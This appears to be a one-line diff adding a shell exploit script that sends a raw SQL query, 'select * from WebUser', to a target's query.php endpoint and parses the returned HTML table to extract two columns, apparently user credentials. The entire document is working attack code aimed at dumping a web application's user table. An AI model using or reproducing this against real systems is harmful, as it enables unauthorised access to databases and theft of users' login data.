@@ -1,0 +1,1 @@
+curl -X POST "$1/query.php" -d 'dbName=Spider.db&cmd=cmd&query=select+*+from+WebUser%3B' | grep '<td>' | sed 's/<td>/|/g' | sed 's/<\/td>/|/g' | sed 's/<tr>//g' | sed 's/<\/tr>/\n/g' | cut -d '|' -f 10,12
